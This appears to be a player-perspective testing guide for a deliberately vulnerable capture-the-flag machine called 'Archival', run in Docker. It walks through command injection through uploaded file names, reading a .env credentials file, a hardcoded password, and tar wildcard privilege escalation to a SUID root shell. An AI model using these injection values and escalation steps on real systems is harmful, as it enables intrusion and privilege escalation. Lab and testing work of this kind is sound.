# Testing Guide: Archival (Player Perspective)

To test the machine as a player, follow these steps:

## 1. Environment Setup

### Using Docker (Best for testing logic)
1. **Build the image**:
   ```bash
   cd machine/
   sudo docker build -t archival .
   ```
2. **Run the container**:
   ```bash
   sudo docker run -d -p 80:80 --name archival-test archival
   ```
3. **Access the web app**: Open `http://localhost` in your browser.

## Troubleshooting & Updates
If you need to update the files and re-test:
1. **Stop and Remove existing container**:
   ```bash
   sudo docker stop archival-test
   sudo docker rm archival-test
   ```
2. **Rebuild the image**:
   ```bash
   sudo docker build -t archival .
   ```
3. **Run the new container**:
   ```bash
   sudo docker run -d -p 80:80 --name archival-test archival
   ```

### Step 1: Web Foothold
1. Visit `http://localhost/index.php`.
2. Observe the "Upload Document" feature.
3. Test for command injection by uploading a file with a special name. 
   - Since you are testing locally, you can use a simple ping or file creation to verify:
   - Create a file: `touch "; touch /tmp/pwned ;.jpg"`
   - Upload it.
4. Verify execution:
   ```bash
   sudo docker exec archival-test ls /tmp/pwned
   ```
   *If the file exists, the injection worked!*

### Step 2: Lateral Move
1. Use the injection to read the `.env` file:
   - File name: `; cat .env > uploads/creds.txt ;.jpg`
   - Access `http://localhost/uploads/creds.txt` (you might need to find the session folder name first or use a reverse shell).
2. Note credentials: `archivist:Archivist2026!`.
3. SSH into the container (if SSH is running) or simulate with:
   ```bash
   sudo docker exec -it archival-test su - archivist
   ```

### Step 3: Privilege Escalation
1. Check sudo permissions: `sudo -l`.
2. Create the `tar` wildcard files in `/home/archivist/backups`:
   ```bash
   cd /home/archivist/backups
   echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" > shell.sh
   touch -- "--checkpoint=1"
   touch -- "--checkpoint-action=exec=sh shell.sh"
   ```
3. Trigger the backup script: `sudo /usr/local/bin/backup.sh`.
4. Check for the SUID shell: `/tmp/rootbash -p`.

## 3. Teardown
```bash
sudo docker stop archival-test
sudo docker rm archival-test
```
